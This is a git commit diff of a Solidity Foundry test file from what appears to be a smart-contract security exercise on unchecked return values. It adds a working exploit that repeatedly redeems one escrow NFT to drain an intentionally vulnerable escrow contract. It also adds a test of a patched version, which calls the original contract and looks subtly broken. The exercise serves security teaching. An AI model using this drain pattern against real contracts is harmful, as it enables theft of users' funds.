e8b2f48fc82d8866bcce1ae01cd4df123e4f8fa5
firatstory.eth <talefirat@gmail.com>
2024-04-28 12:25:30 +0200

    feat: :sparkles: add TestUR2 test and EscrowSecured

--- test/unchecked-returns-2/TestUR2.t.sol
+++ test/unchecked-returns-2/TestUR2.t.sol
@@ -4,19 +4,19 @@ pragma solidity ^0.8.13;
 import "forge-std/Test.sol";
 import "forge-std/console.sol";
 import "src/unchecked-returns-2/Escrow.sol";
+import "src/unchecked-returns-2/EscrowSecured.sol";
 import "src/unchecked-returns-2/EscrowNFT.sol";
 
 /**
  * @dev run "forge test -vvv --match-contract UR2"
  */
 contract TestUR2 is Test {
-    
     uint256 constant ONE_MONTH = 30 days;
     uint256 constant USER1_ESCROW_AMOUNT = 10 ether;
     uint256 constant USER2_ESCROW_AMOUNT = 54 ether;
     uint256 constant USER3_ESCROW_AMOUNT = 72 ether;
     uint256 constant USERS_INITIAL_BALANCE = 100 ether;
-    
+
     address deployer = makeAddr("deployer");
     address user1 = makeAddr("user1");
     address user2 = makeAddr("user2");
@@ -24,6 +24,7 @@ contract TestUR2 is Test {
     address attacker = makeAddr("attacker");
 
     EscrowNFT escrowNFT;
+    EscrowSecured escrowSecured;
     Escrow escrow;
 
     uint256 attackerInitialBalance;
@@ -53,7 +54,7 @@ contract TestUR2 is Test {
         escrowNFT.approve(address(escrow), tokenId);
         vm.expectRevert("Escrow period not expired.");
         escrow.redeemEthFromEscrow(tokenId);
-        
+
         // Fast forward to mature time
         vm.warp(block.timestamp + ONE_MONTH);
 
@@ -70,6 +71,7 @@ contract TestUR2 is Test {
         uint256 balanceAfter = user2.balance;
         assertGt(balanceAfter, balanceBefore + USER1_ESCROW_AMOUNT - 0.1 ether);
     }
+
     function testExploit() public {
         /* SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
         // Escrow more eth
@@ -82,13 +84,53 @@ contract TestUR2 is Test {
         vm.startPrank(user3);
         escrow.escrowEth{value: USER3_ESCROW_AMOUNT}(user1, ONE_MONTH);
 
+        /**
+         * CODE YOUR SOLUTION HERE
+         */
+        vm.startPrank(attacker);
+        escrow.escrowEth{value: 2 ether}(attacker, 0);
 
-        /** CODE YOUR SOLUTION HERE */
+        uint256 tokenId = escrowNFT.tokenCounter();
 
-        /** SUCCESS CONDITIONS */
+        for (uint256 index = 0; index < 69; index++) {
+            escrow.redeemEthFromEscrow(tokenId);
+        }
 
-		// Attacker should drain the escrow contract
-        assertGt(attacker.balance, attackerInitialBalance + USER1_ESCROW_AMOUNT + USER2_ESCROW_AMOUNT + USER3_ESCROW_AMOUNT - 0.1 ether);
+        /**
+         * SUCCESS CONDITIONS
+         */
+
+        // Attacker should drain the escrow contract
+        assertGt(
+            attacker.balance,
+            attackerInitialBalance + USER1_ESCROW_AMOUNT + USER2_ESCROW_AMOUNT + USER3_ESCROW_AMOUNT - 0.1 ether
+        );
         assertEq(address(escrow).balance, 0);
+    }
+
+    function TestExploitWithSecured() external {
+        escrowSecured = new EscrowSecured(address(escrowNFT));
+
+        // Escrow more eth
+        vm.startPrank(user1);
+        escrowSecured.escrowEth{value: USER1_ESCROW_AMOUNT}(user2, ONE_MONTH);
+
+        vm.startPrank(user2);
+        escrowSecured.escrowEth{value: USER2_ESCROW_AMOUNT}(user1, ONE_MONTH);
+
+        vm.startPrank(user3);
+        escrowSecured.escrowEth{value: USER3_ESCROW_AMOUNT}(user1, ONE_MONTH);
+
+        vm.startPrank(attacker);
+        escrow.escrowEth{value: 2 ether}(attacker, 0);
+
+        uint256 tokenId = escrowNFT.tokenCounter();
+
+        vm.expectRevert("NFT can't be burned");
+        for (uint256 index = 0; index < 69; index++) {
+            escrow.redeemEthFromEscrow(tokenId);
+        }
+
+        assertEq(attacker.balance, 2 ether);
     }
 }
